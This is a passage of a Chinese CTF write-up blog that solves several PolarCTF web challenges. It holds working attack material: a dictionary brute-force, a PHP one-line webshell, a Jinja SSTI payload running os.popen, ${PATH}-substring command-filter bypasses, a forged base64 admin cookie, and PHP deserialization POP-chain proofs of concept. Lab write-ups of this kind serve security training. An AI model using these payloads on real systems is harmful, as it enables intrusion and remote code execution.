+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://ca7f77f6-78a6-<span class="number">41e1</span>-a2f2-85e4b6427d62.www.polarctf.com:<span class="number">8090</span>/password.txt</span><br></pre></td></tr></table></figure>
+
+<p>找到字典，密码爆破</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623152303458.png" alt="image-20250623152303397" loading="lazy"></p>
+<p>找到密码：hunangleiSAMA0712</p>
+<p>另外源码中有注释：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623152653703.png" alt="image-20250623152653492" loading="lazy"></p>
+<p>使用万能验证码0000登录</p>
+<p>继续密码爆破</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623153016000.png" alt="image-20250623153015883" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623153456556.png" alt="image-20250623153456508" loading="lazy"></p>
+<p>第二步密码：huan9le1Sam0</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623153604388.png" alt="image-20250623153604288" loading="lazy"></p>
+<h3 id="rce命令执行系统"><a href="#rce命令执行系统" class="headerlink" title="rce命令执行系统"></a>rce命令执行系统</h3><p>简单的rce，有过滤</p>
+<p>尝试双单引号绕过</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623154003085.png" alt="image-20250623154003013" loading="lazy"></p>
+<p>但是这里过滤了’.’    无法读取到文件</p>
+<p>尝试访问路由f1ag.php</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">既然你找到这里了那就告诉你点东西吧 异或后它好像改名叫XOR_KEY，给他传个参试一试呢，对了，咱们的靶场叫什么来着？🤔 </span><br></pre></td></tr></table></figure>
+
+<p>XOR_KEY&#x3D;Polar</p>
+<p>尝试添加环境变量：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">env XOR_KEY=Polar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250623154751702.png" alt="image-20250623154751639" loading="lazy"></p>
+<h3 id="真假ECR"><a href="#真假ECR" class="headerlink" title="真假ECR"></a>真假ECR</h3><p>非预期，转义绕过，可以直接读取flag</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625083920934.png" alt="image-20250625083920853" loading="lazy"></p>
+<h3 id="狗黑子的隐藏"><a href="#狗黑子的隐藏" class="headerlink" title="狗黑子的隐藏"></a>狗黑子的隐藏</h3><p>删除hidden标签，发现可以命令执行，但是有waf</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625084241410.png" alt="image-20250625084241350" loading="lazy"></p>
+<p>有写文件的权限，可以写一句话木马连shell：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> &gt;&gt;<span class="number">2.</span>php</span><br></pre></td></tr></table></figure>
+
+<p>创建新文件会服务器异常，追加可以成功写入木马</p>
+<h3 id="狗黑子的变量"><a href="#狗黑子的变量" class="headerlink" title="狗黑子的变量"></a>狗黑子的变量</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$gou = $_GET[<span class="string">&quot;gou&quot;</span>];</span><br><span class="line">$gou = str_replace([<span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>], <span class="string">&#x27;&#x27;</span>, $gou);</span><br><span class="line">$hei = array(<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$heizi = str_ireplace($hei, <span class="string">&#x27;&#x27;</span>, $gou);</span><br><span class="line"><span class="keyword">if</span> ($heizi !== $gou) &#123;</span><br><span class="line">    die(<span class="string">&quot;heizi&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system($gou);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了取反异或，还有字符匹配，很难利用</p>
+<p>扫目录发现admin.php路由</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625092628515.png" alt="image-20250625092628385" loading="lazy"></p>
+<p>发现字符过滤没有完全过滤字符，可以使用path拼接绕过：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查看$PATH</span><br><span class="line">/usr/local/sbin:/usr/local/<span class="built_in">bin</span>:/usr/sbin:/usr/<span class="built_in">bin</span>:/sbin:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">ls  -&gt;         $&#123;PATH:<span class="number">5</span>:<span class="number">1</span>&#125;$&#123;PATH:<span class="number">2</span>:<span class="number">1</span>&#125;</span><br><span class="line">提取出PATH的第<span class="number">6</span>位和第<span class="number">2</span>位</span><br><span class="line"></span><br><span class="line">cat ../*  -&gt; $&#123;PATH:<span class="number">7</span>:<span class="number">1</span>&#125;at ../</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625093602486.png" alt="image-20250625093602377" loading="lazy"></p>
+<h3 id="ghost-render"><a href="#ghost-render" class="headerlink" title="ghost_render"></a>ghost_render</h3><p>Markdown渲染平台，上传md文件渲染，尝试SSTI漏洞</p>
+<p>上传49</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625094117208.png" alt="image-20250625094117149" loading="lazy"></p>
+<p>可以利用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /var&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625094343148.png" alt="image-20250625094343090" loading="lazy"></p>
+<h3 id="你也玩铲吗"><a href="#你也玩铲吗" class="headerlink" title="你也玩铲吗"></a>你也玩铲吗</h3><p>注册账户后源码中有hint</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625094633796.png" alt="image-20250625094633735" loading="lazy"></p>
+<p>扫描目录</p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625100550172.png" alt="image-20250625100550100" loading="lazy"></p>
+<p>发现管理员认证页面，尝试伪造cookie</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user:admin</span><br><span class="line">—&gt;根据提示：base64</span><br><span class="line">Cookie:auth=dXNlcjphZG1pbg==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625101516600.png" alt="image-20250625101516405" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/gzynuli/blog-img/main/20250625101618965.png" alt="image-20250625101618246" loading="lazy"></p>
+<h3 id="nukaka-ser2"><a href="#nukaka-ser2" class="headerlink" title="nukaka_ser2"></a>nukaka_ser2</h3><p>分析链子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagReader</span> &#123;</span><br><span class="line">    private $logfile = <span class="string">&quot;/tmp/log.txt&quot;</span>;</span><br><span class="line">    protected $content = <span class="string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">&#x27;/flag&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Flag file not found!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataValidator</span> &#123;</span><br><span class="line">    public static function check($<span class="built_in">input</span>) &#123;</span><br><span class="line">        $filtered = preg_replace(<span class="string">&#x27;/[^\w]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $<span class="built_in">input</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen($filtered) &gt; <span class="number">10</span> ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($data) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>::check($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeDanger</span> &#123;</span><br><span class="line">    private $buffer;</span><br><span class="line">    </span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;buffer = base64_encode($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        <span class="keyword">if</span> (rand(<span class="number">0</span>, <span class="number">100</span>) &gt; <span class="number">50</span>) &#123;</span><br><span class="line">            $this-&gt;buffer = str_rot13($this-&gt;buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VulnerableClass</span> &#123;</span><br><span class="line">    public $logger;</span><br><span class="line">    private $debugMode = false;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;debugMode) &#123;</span><br><span class="line">            echo $this-&gt;logger;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;cleanup();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function cleanup() &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;logger instanceof DataValidator) &#123;</span><br><span class="line">            $this-&gt;logger = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function sanitize_input($data) &#123;</span><br><span class="line">    $data = trim($data);</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    $raw = base64_decode($_GET[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^[a-zA-Z0-9\/+]+=&#123;0,2&#125;$/&#x27;</span>, $_GET[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">        unserialize($raw); </span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>首先触发wakeup方法，之后触发destruct方法，这里private保护可以改为public，我们需要将debugmode改为true，触发</p>
+<p>echo $this-&gt;logger;从而触发tostring方法，打印出flag</p>
+<p>poc：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FlagReader</span> &#123;</span><br><span class="line">    private $logfile = <span class="string">&quot;/tmp/log.txt&quot;</span>;</span><br><span class="line">    protected $content = <span class="string">&quot;&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">&#x27;/flag&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Flag file not found!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataValidator</span> &#123;</span><br><span class="line">    public static function check($<span class="built_in">input</span>) &#123;</span><br><span class="line">        $filtered = preg_replace(<span class="string">&#x27;/[^\w]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $<span class="built_in">input</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen($filtered) &gt; <span class="number">10</span> ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($data) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>::check($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeDanger</span> &#123;</span><br><span class="line">    private $buffer;</span><br><span class="line"></span><br><span class="line">    public function __construct($data) &#123;</span><br><span class="line">        $this-&gt;buffer = base64_encode($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        <span class="keyword">if</span> (rand(<span class="number">0</span>, <span class="number">100</span>) &gt; <span class="number">50</span>) &#123;</span><br><span class="line">            $this-&gt;buffer = str_rot13($this-&gt;buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VulnerableClass</span> &#123;</span><br><span class="line">    public $logger;</span><br><span class="line">    private $debugMode = true;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;debugMode) &#123;</span><br><span class="line">            echo $this-&gt;logger;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $this-&gt;cleanup();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function cleanup() &#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;logger instanceof DataValidator) &#123;</span><br><span class="line">            $this-&gt;logger = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function sanitize_input($data) &#123;</span><br><span class="line">    $data = trim($data);</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = new VulnerableClass();</span><br><span class="line">$b = new FlagReader();</span><br><span class="line">$a-&gt;logger = $b;</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="easyRead"><a href="#easyRead" class="headerlink" title="easyRead"></a>easyRead</h3><p>源码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">Class Read&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $<span class="keyword">is</span>;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;<span class="keyword">is</span>-&gt;run(<span class="string">&quot;Read&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&gt;&gt;&gt;&quot;</span>.$this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Help</span>&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $<span class="built_in">str</span>;</span><br><span class="line">    public function Printf($what)&#123;</span><br><span class="line">        echo <span class="string">&quot;Hello&gt;&gt;&gt;&quot;</span>.$what;</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;<span class="built_in">str</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)&#123;</span><br><span class="line">        $this-&gt;Printf($name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Polar</span> &#123;</span><br><span class="line">    private  $var;</span><br><span class="line">    public function getit($value)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">eval</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;getit($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Doit</span>&#123;</span><br><span class="line">    public $<span class="keyword">is</span>;</span><br><span class="line">    private $source;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;<span class="keyword">is</span> = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $vul = $this-&gt;<span class="keyword">is</span>;</span><br><span class="line">        <span class="keyword">return</span> $vul();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;polar&#x27;</span>]))&#123;</span><br><span class="line"><span class="meta">    @unserialize(<span class="params">$_GET[<span class="string">&#x27;polar&#x27;</span>]</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析链子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wakeup-&gt;tostring-&gt;call-&gt;printf-&gt;get-&gt;invoke-&gt;getit</span><br></pre></td></tr></table></figure>
+
+<p>poc：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Class Read&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $<span class="keyword">is</span>;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;<span class="keyword">is</span>-&gt;run(<span class="string">&quot;Read&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo <span class="string">&quot;Hello&gt;&gt;&gt;&quot;</span>.$this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Help</span>&#123;</span><br><span class="line">    public $source= <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    public $<span class="built_in">str</span>;</span><br><span class="line">    public function Printf($what)&#123;</span><br><span class="line">        echo <span class="string">&quot;Hello&gt;&gt;&gt;&quot;</span>.$what;</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;<span class="built_in">str</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)&#123;</span><br><span class="line">        $this-&gt;Printf($name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Polar</span> &#123;</span><br><span class="line">    private  $var = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line">    public function getit($value)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">eval</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;getit($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Doit</span>&#123;</span><br><span class="line">    public $<span class="keyword">is</span>;</span><br><span class="line">    private $source;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $vul = $this-&gt;<span class="keyword">is</span>;</span><br><span class="line">        <span class="keyword">return</span> $vul();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Read();</span><br><span class="line">$b = new Read();</span><br><span class="line">$a-&gt;source = $b;</span><br><span class="line">$c = new Help();</span><br><span class="line">$b-&gt;<span class="keyword">is</span> = $c;</span><br><span class="line">$d = new Doit();</span><br><span class="line">$c-&gt;<span class="built_in">str</span> = $d;</span><br><span class="line">$e = new Polar();</span><br><span class="line">$d-&gt;<span class="keyword">is</span> = $e;</span><br><span class="line"></span><br><span class="line">echo serialize($a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是我也没搞懂为啥flag就是这个：flag{Hello&gt;&gt;&gt;Hello&gt;&gt;&gt;run}</p>
+]]></content>
+      <categories>
+        <category>2025比赛归纳</category>
+      </categories>
+      <tags>
+        <tag>CTF赛事</tag>
+      </tags>
+  </entry>
+</search>
